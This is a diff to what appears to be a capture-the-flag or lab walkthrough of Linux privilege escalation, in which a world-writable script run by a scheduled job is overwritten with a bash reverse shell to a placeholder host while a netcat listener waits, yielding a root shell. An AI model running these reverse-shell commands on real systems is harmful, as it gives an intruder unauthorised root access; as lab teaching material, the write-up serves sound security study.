@@ -139,17 +139,26 @@ ls -la ~/scripts        # planner.sh -> runs /etc/print.sh
 ls -la /etc/print.sh    # -rwxrwxrwx : anyone can edit it
 ```
 
-Append a reverse shell to `/etc/print.sh`, start a listener, and wait for the next run:
+The job runs on a timer, so order matters: start the listener **first**, then edit the
+script. Once you save it, the next tick runs it, so the listener has to be waiting already.
 
 ```bash
-echo 'sh -i >& /dev/tcp/<LHOST>/9001 0>&1' >> /etc/print.sh
-
-# on your machine, before the job fires
+# 1) on your machine, before touching anything
 nc -lnvp 9001
 ```
 
-When the scheduled `planner.sh` fires and runs `/etc/print.sh`, the listener gets a shell as
-**root**:
+```bash
+# 2) on the target: open /etc/print.sh in nano and replace its contents with a reverse shell
+nano /etc/print.sh
+```
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<LHOST>/9001 0>&1
+```
+
+Save and exit. On the next scheduled run, root executes `/etc/print.sh` and the listener
+gets a shell as **root**:
 
 ```bash
 cat /root/root.txt
